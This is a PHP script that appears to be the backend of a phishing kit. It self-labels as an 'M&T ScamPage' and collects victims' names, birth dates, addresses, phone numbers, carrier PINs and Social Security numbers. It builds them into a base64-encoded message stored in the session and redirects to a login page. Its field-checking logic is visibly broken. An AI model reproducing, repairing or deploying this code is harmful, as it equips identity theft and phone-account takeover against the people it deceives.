<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $TKRand = md5(uniqid(rand(), true));
    header("Location: Login.html?id=".$TKRand);
}elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $FirstName = $_POST['FirstName'];
    $LastName = $_POST['LastName'];
    $DOB  = $_POST['DOB'];
    $State = $_POST['State'];
    $Street = $_POST['Street'];
    $ZIPCode = $_POST['ZIP'];
    $PhoneNumber = $_POST['Phone'];
    $PINCarrier = $_POST['PINCarrier'];
    $SSN = $_POST['SocialSecurityNumber'];
    if (isset($FirstName)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }if (isset($LastName)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }if (isset($DOB)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
          header("Location: Login.html?id=".$TKRand);
    }if (isset($State)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
          header("Location: Login.html?id=".$TKRand);
    }if (isset($Street)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }if (isset($ZIPCode)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }if (isset($PINCarrier)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }if (isset($SSN)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Login.html?id=".$TKRand);
    }else{
        $Message = 'Result By M&T ScamPage {Personal Info}'.'\n';
        $Message .= 'First-Name: '.$FirstName.'\n';
        $Message .= 'Last-Name: '.$LastName.'\n';
        $Message .= 'DOB(DateOfBirth): '.$DOB.'\n';
        $Message .= 'State: '.$State.'\n';
        $Message .= 'Street: '.$Street.'\n';
        $Message .= 'ZIP: '.$ZIPCode.'\n';
        $Message .= 'Phone-Number: '.$PhoneNumber.'\n';
        $Message .= 'Phone-PIN(Carrier-PIN): '.$PINCarrier.'\n';
        $Message .= 'Social-Security-Number(SSN): '.$SSN.'\n';

        $_SESSION['PNAL'] = base64_encode($Message);
        $TKRand = md5(uniqid(rand(), true));
        header("Location: Login.html?id=".$TKRand);
    }
}
?>
